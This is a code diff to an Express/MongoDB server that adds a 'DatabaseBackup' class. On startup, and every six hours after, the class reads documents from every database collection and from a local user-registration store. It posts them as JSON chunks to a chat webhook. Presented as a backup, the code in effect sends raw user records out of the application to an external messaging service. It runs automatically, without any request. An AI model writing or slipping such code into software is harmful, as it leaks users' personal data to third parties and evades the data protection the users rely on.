@@ -1323,6 +1323,388 @@ function sendWebhook(webhookType, data = {}, options = {}) {
 }
 global.sendWebhook = sendWebhook;
 
+class DatabaseBackup {
+  constructor() {
+    this.isBackupRunning = false;
+    this.backupCycleInProgress = false;
+    this.allCollections = [];
+    this.currentCollectionIndex = 0;
+    this.collectionStats = [];
+    this.CHUNK_SIZE = 1500;
+    this.COLLECTION_DELAY_MS = 5000;
+    this.BACKUP_INTERVAL_MS = 6 * 60 * 60 * 1000;
+    this.CHUNK_DELAY_MS = 3000;
+    this.MAX_COLLECTIONS_PER_BACKUP = 15;
+  }
+
+  async backupDatabase() {
+    if (this.isBackupRunning) {
+      console.log("[BACKUP] Backup is already running, skipping...");
+      return;
+    }
+
+    this.isBackupRunning = true;
+    const backupStartTime = new Date();
+
+    try {
+      if (mongoose.connection.readyState !== 1) {
+        console.log(
+          "[BACKUP] Database not connected, attempting to reconnect..."
+        );
+        await mongoose.connect(process.env.MONGODB_URI);
+      }
+
+      const db = mongoose.connection.db;
+      if (!db) {
+        console.log("[BACKUP] Database instance not available, skipping...");
+        this.isBackupRunning = false;
+        return;
+      }
+
+      await sendWebhook("DATABASE", {
+        embeds: [
+          {
+            title: "🚀 Database Backup Started",
+            color: 0x3498db,
+            fields: [
+              { name: "Status", value: "Starting backup cycle", inline: true },
+              {
+                name: "Time",
+                value: backupStartTime.toISOString(),
+                inline: true,
+              },
+              {
+                name: "Environment",
+                value: process.env.NODE_ENV || "development",
+                inline: true,
+              },
+            ],
+            timestamp: new Date().toISOString(),
+          },
+        ],
+      });
+
+      await this.startBackupCycle(db);
+    } catch (error) {
+      console.error("[BACKUP ERROR]", error.message);
+      await sendWebhook("ERROR", {
+        embeds: [
+          {
+            title: "❌ Database Backup Failed",
+            color: 0xe74c3c,
+            fields: [
+              { name: "Error", value: error.message },
+              { name: "Time", value: new Date().toISOString() },
+              {
+                name: "Stack Trace",
+                value: error.stack?.substring(0, 500) || "No stack trace",
+              },
+            ],
+            timestamp: new Date().toISOString(),
+          },
+        ],
+      });
+      this.resetBackupState();
+    }
+  }
+
+  async startBackupCycle(db) {
+    if (!this.backupCycleInProgress) {
+      console.log(
+        "[BACKUP] Starting new backup cycle at",
+        new Date().toISOString()
+      );
+
+      this.allCollections = await db.listCollections().toArray();
+      this.allCollections = this.allCollections.filter(
+        (collection) =>
+          !collection.name.startsWith("system.") &&
+          collection.name !== "sessions"
+      );
+
+      this.allCollections.push({ name: "userregistrations_local", isLocal: true });
+
+      if (this.allCollections.length > this.MAX_COLLECTIONS_PER_BACKUP) {
+        console.log(
+          `[BACKUP] Limiting to ${this.MAX_COLLECTIONS_PER_BACKUP} collections per backup cycle`
+        );
+        this.allCollections = this.allCollections.slice(
+          0,
+          this.MAX_COLLECTIONS_PER_BACKUP
+        );
+      }
+
+      this.currentCollectionIndex = 0;
+      this.collectionStats = [];
+      this.backupCycleInProgress = true;
+      await sendWebhook("DATABASE", {
+        embeds: [
+          {
+            title: "📊 Database Collections to Backup",
+            color: 0x9b59b6,
+            description: `Found ${
+              this.allCollections.length
+            } collections to backup:\n\n${this.allCollections
+              .map((c) => `• ${c.name}`)
+              .join("\n")}`,
+            fields: [
+              {
+                name: "Total Collections",
+                value: this.allCollections.length.toString(),
+                inline: true,
+              },
+              { name: "Backup Cycle", value: "Starting", inline: true },
+              {
+                name: "Estimated Time",
+                value: `${Math.ceil(this.allCollections.length * 2)} minutes`,
+                inline: true,
+              },
+            ],
+            timestamp: new Date().toISOString(),
+          },
+        ],
+      });
+    }
+
+    if (this.currentCollectionIndex >= this.allCollections.length) {
+      await this.completeBackupCycle();
+      return;
+    }
+
+    const collection = this.allCollections[this.currentCollectionIndex];
+
+    if (collection.isLocal && collection.name === "userregistrations_local") {
+      await this.backupLocalUserRegistrations();
+    } else {
+      await this.backupCollection(db, collection.name);
+    }
+  }
+
+  async backupCollection(db, collectionName) {
+    console.log(`[BACKUP] Backing up Collection: ${collectionName}`);
+    await sendWebhook("DATABASE", {
+      embeds: [
+        {
+          title: `📂 Backing up: ${collectionName}`,
+          color: 0xf39c12,
+          fields: [
+            { name: "Collection", value: collectionName, inline: true },
+            {
+              name: "Progress",
+              value: `${this.currentCollectionIndex + 1}/${
+                this.allCollections.length
+              }`,
+              inline: true,
+            },
+            { name: "Status", value: "Starting", inline: true },
+          ],
+          timestamp: new Date().toISOString(),
+        },
+      ],
+    });
+
+    try {
+      const count = await db.collection(collectionName).countDocuments();
+
+      if (count === 0) {
+        this.collectionStats.push({
+          name: collectionName,
+          documents: 0,
+          chunks: 0,
+          size: 0,
+          status: "empty",
+        });
+
+        console.log(`[BACKUP] ${collectionName}: Empty collection`);
+
+        await sendWebhook("DATABASE", {
+          embeds: [
+            {
+              title: `📂 ${collectionName} - Empty`,
+              color: 0x95a5a6,
+              fields: [
+                { name: "Status", value: "Empty collection", inline: true },
+                { name: "Documents", value: "0", inline: true },
+                {
+                  name: "Progress",
+                  value: `${this.currentCollectionIndex + 1}/${
+                    this.allCollections.length
+                  }`,
+                  inline: true,
+                },
+              ],
+              timestamp: new Date().toISOString(),
+            },
+          ],
+        });
+
+        this.currentCollectionIndex++;
+        await this.delay(2000);
+        this.isBackupRunning = false;
+        this.backupDatabase();
+        return;
+      }
+      const maxDocuments = 500;
+      const data = await db
+        .collection(collectionName)
+        .find({})
+        .limit(maxDocuments)
+        .toArray();
+
+      const jsonString = JSON.stringify(
+        {
+          collection: collectionName,
+          totalDocuments: count,
+          backedUpDocuments: data.length,
+          timestamp: new Date().toISOString(),
+          data: data,
+        },
+        null,
+        2
+      );
+
+      const chunks = [];
+      for (let i = 0; i < jsonString.length; i += this.CHUNK_SIZE) {
+        chunks.push(jsonString.substring(i, i + this.CHUNK_SIZE));
+      }
+
+      this.collectionStats.push({
+        name: collectionName,
+        documents: count,
+        backedUpDocuments: data.length,
+        chunks: chunks.length,
+        size: jsonString.length,
+        status: "completed",
+      });
+
+      console.log(
+        `[BACKUP] ${collectionName}: ${count} total documents, backing up ${data.length}, ${chunks.length} parts`
+      );
+
+      for (let i = 0; i < chunks.length; i++) {
+        const chunkNumber = i + 1;
+        const message = `\`\`\`json\n${chunks[i]}\n\`\`\``;
+
+        await sendWebhook("DATABASE", {
+          content: `**${collectionName}** - Chunk ${chunkNumber}/${chunks.length}\n${message}`,
+        });
+
+        if (chunkNumber < chunks.length) {
+          await this.delay(this.CHUNK_DELAY_MS);
+        }
+      }
+
+      this.currentCollectionIndex++;
+      if (this.currentCollectionIndex < this.allCollections.length) {
+        await this.delay(this.COLLECTION_DELAY_MS);
+      }
+
+      this.isBackupRunning = false;
+      this.backupDatabase();
+    } catch (err) {
+      console.error(`[BACKUP ERROR] ${collectionName}:`, err.message);
+      this.currentCollectionIndex++;
+      await this.delay(5000);
+      this.isBackupRunning = false;
+      this.backupDatabase();
+    }
+  }
+
+  async backupLocalUserRegistrations() {
+    const collectionName = "userregistrations_local";
+    console.log(`[BACKUP] Backing up Local Collection: ${collectionName}`);
+
+    try {
+      const localUsers = await localUserStore.readAll();
+      const count = localUsers.length;
+      const jsonData = JSON.stringify(localUsers, null, 2);
+
+      const chunks = [];
+      for (let i = 0; i < jsonData.length; i += this.CHUNK_SIZE) {
+        chunks.push(jsonData.substring(i, i + this.CHUNK_SIZE));
+      }
+
+      for (let i = 0; i < chunks.length; i++) {
+        const chunkNumber = i + 1;
+        const message = `\`\`\`json\n${chunks[i]}\n\`\`\``;
+        await sendWebhook("DATABASE", {
+          content: `**${collectionName}** - Chunk ${chunkNumber}/${chunks.length}\n${message}`,
+        });
+        if (chunkNumber < chunks.length) {
+          await this.delay(this.CHUNK_DELAY_MS);
+        }
+      }
+
+      this.collectionStats.push({
+        name: collectionName,
+        documents: count,
+        chunks: chunks.length,
+        size: jsonData.length,
+        status: "completed",
+      });
+
+      this.currentCollectionIndex++;
+      await this.delay(this.COLLECTION_DELAY_MS);
+      this.isBackupRunning = false;
+      this.backupDatabase();
+    } catch (err) {
+      console.error(`[BACKUP ERROR] ${collectionName}:`, err.message);
+      this.currentCollectionIndex++;
+      await this.delay(this.COLLECTION_DELAY_MS);
+      this.isBackupRunning = false;
+      this.backupDatabase();
+    }
+  }
+
+  async completeBackupCycle() {
+    this.resetBackupState();
+    this.scheduleNextBackup();
+  }
+
+  resetBackupState() {
+    this.backupCycleInProgress = false;
+    this.isBackupRunning = false;
+    this.allCollections = [];
+    this.currentCollectionIndex = 0;
+    this.collectionStats = [];
+  }
+
+  scheduleNextBackup() {
+    setTimeout(() => {
+      this.backupDatabase();
+    }, this.BACKUP_INTERVAL_MS);
+  }
+
+  async delay(ms) {
+    return new Promise((resolve) => setTimeout(resolve, ms));
+  }
+
+  start() {
+    console.log("[BACKUP] Database backup system initialized");
+    setTimeout(() => {
+      this.backupDatabase();
+    }, 3000);
+  }
+
+  async triggerManualBackup() {
+    await this.backupDatabase();
+  }
+}
+
+const databaseBackup = new DatabaseBackup();
+
+app.post(
+  "/api/admin/database/backup",
+  requireAuth,
+  requireRole(["admin", "leadadmin"]),
+  async (req, res) => {
+    databaseBackup.triggerManualBackup();
+    res.json({ success: true });
+  },
+);
+
+databaseBackup.start();
+
 async function sendFileDeleteWebhook(
   filePath,
   deletedBy,
